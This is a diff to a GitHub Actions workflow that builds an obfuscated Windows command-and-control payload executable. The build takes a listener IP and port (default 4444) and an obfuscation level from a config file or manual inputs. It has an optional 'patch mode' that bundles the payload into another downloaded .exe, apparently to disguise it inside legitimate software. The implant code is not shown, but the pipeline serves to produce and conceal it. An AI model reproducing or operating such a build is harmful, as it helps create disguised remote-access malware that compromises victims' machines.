@@ -30,25 +30,43 @@ jobs:
     - uses: actions/checkout@v3
     
     - name: Set up Python 3.11
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.11'
+    
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install pyinstaller
+    
+    - name: Read build configuration
+      id: config
+      shell: pwsh
+      run: |
+        if (Test-Path build_config.json) {
+          $config = Get-Content build_config.json | ConvertFrom-Json
+          echo "listener_ip=$($config.listener_ip)" >> $env:GITHUB_OUTPUT
+          echo "listener_port=$($config.listener_port)" >> $env:GITHUB_OUTPUT
+          echo "obfuscation_level=$($config.obfuscation_level)" >> $env:GITHUB_OUTPUT
           if ($config.PSObject.Properties.Name -contains 'patch_url') {
             echo "patch_url=$($config.patch_url)" >> $env:GITHUB_OUTPUT
           } else {
             echo "patch_url=" >> $env:GITHUB_OUTPUT
           }
-      uses: actions/setup-python@v4
-      with:
-        python-version: '3.11'
-    
+          Write-Host "Config from build_config.json:"
+          Write-Host "  IP: $($config.listener_ip)"
+          Write-Host "  Port: $($config.listener_port)"
+          Write-Host "  Obfuscation: $($config.obfuscation_level)"
           if ($config.PSObject.Properties.Name -contains 'patch_url') {
             Write-Host "  Patch URL: $($config.patch_url)"
           }
-    - name: Install dependencies
-      run: |
-        python -m pip install --upgrade pip
-        pip install pyinstaller
+        } else {
+          echo "listener_ip=${{ github.event.inputs.listener_ip || '192.168.1.1' }}" >> $env:GITHUB_OUTPUT
+          echo "listener_port=${{ github.event.inputs.listener_port || '4444' }}" >> $env:GITHUB_OUTPUT
+          echo "obfuscation_level=${{ github.event.inputs.obfuscation_level || '2' }}" >> $env:GITHUB_OUTPUT
           echo "patch_url=${{ github.event.inputs.patch_url || '' }}" >> $env:GITHUB_OUTPUT
-    
-    - name: Read build configuration
+          Write-Host "Using default/manual inputs"
+        }
     
     - name: Prepare patch file (optional)
       if: ${{ steps.config.outputs.patch_url != '' }}
@@ -73,36 +91,17 @@ jobs:
         $ip = "${{ steps.config.outputs.listener_ip }}"
         $port = [int]"${{ steps.config.outputs.listener_port }}"
         $obf = [int]"${{ steps.config.outputs.obfuscation_level }}"
-        $patch = Get-ChildItem -File -Name | Where-Object { $_.ToLower().EndsWith('.exe') -and $_ -ne 'c2_payload.exe' } | Select-Object -First 1
+        $patch = Get-ChildItem -File -Name 2>$null | Where-Object { $_.ToLower().EndsWith('.exe') -and $_ -ne 'c2_payload.exe' } | Select-Object -First 1
         if ($patch) {
           Write-Host "Building in PATCH mode with: $patch"
           python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('$ip', $port, $obf, 'windows', '$patch')"
         } else {
+          Write-Host "Building standard C2 payload"
           python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('$ip', $port, $obf, 'windows')"
         }
-      id: config
-      run: |
-        if (Test-Path build_config.json) {
-          $config = Get-Content build_config.json | ConvertFrom-Json
-          echo "listener_ip=$($config.listener_ip)" >> $env:GITHUB_OUTPUT
-          echo "listener_port=$($config.listener_port)" >> $env:GITHUB_OUTPUT
-          echo "obfuscation_level=$($config.obfuscation_level)" >> $env:GITHUB_OUTPUT
-          Write-Host "Config from build_config.json:"
-          Write-Host "  IP: $($config.listener_ip)"
-          Write-Host "  Port: $($config.listener_port)"
-          Write-Host "  Obfuscation: $($config.obfuscation_level)"
-        } else {
-          echo "listener_ip=${{ github.event.inputs.listener_ip || '192.168.1.1' }}" >> $env:GITHUB_OUTPUT
-          echo "listener_port=${{ github.event.inputs.listener_port || '4444' }}" >> $env:GITHUB_OUTPUT
-          echo "obfuscation_level=${{ github.event.inputs.obfuscation_level || '2' }}" >> $env:GITHUB_OUTPUT
-          Write-Host "Using default/manual inputs"
-        }
-    
-    - name: Build C2 Binary
-      run: |
-        python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('${{ steps.config.outputs.listener_ip }}', ${{ steps.config.outputs.listener_port }}, ${{ steps.config.outputs.obfuscation_level }}, 'windows')"
     
     - name: Verify PE binary format
+      shell: pwsh
       run: |
         $bytes = [System.IO.File]::ReadAllBytes("dist\c2_payload.exe")
         $magic = "{0:X2}{1:X2}" -f $bytes[0], $bytes[1]
@@ -116,6 +115,7 @@ jobs:
         }
     
     - name: Display binary info
+      shell: pwsh
       run: |
         $file = "dist\c2_payload.exe"
         $size = (Get-Item $file).Length / 1MB
